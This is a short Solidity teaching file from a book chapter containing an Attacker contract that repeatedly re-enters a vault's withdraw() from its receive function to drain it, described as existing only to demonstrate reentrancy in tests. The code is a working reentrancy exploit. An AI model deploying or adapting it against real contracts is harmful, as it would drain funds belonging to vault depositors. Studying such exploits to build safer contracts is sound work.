// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @notice The two vault functions the attack needs.
interface IVault {
    /// @notice Deposits the ether sent with the call.
    function deposit() external payable;
    /// @notice Withdraws the caller's whole balance.
    function withdraw() external;
}

/// @title Attacker
/// @author Sami BELHADJ, Book 3, Chapter 3
/// @notice Re-enters withdraw() from its receive function until the vault is
///         empty. Exists only to demonstrate reentrancy in tests.
contract Attacker {
    /// @notice The vault under attack.
    IVault public immutable vault;
    /// @notice How many times receive() re-entered withdraw().
    uint256 public reentries;

    /// @param vault_ Address of the vault to attack.
    constructor(address vault_) {
        vault = IVault(vault_);
    }

    /// @notice Deposits the ether sent, then withdraws it, starting the loop.
    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    /// @notice Re-enters withdraw() while the vault still holds enough ether.
    receive() external payable {
        if (address(vault).balance >= msg.value && msg.value > 0) {
            reentries++;
            vault.withdraw();
        }
    }
}
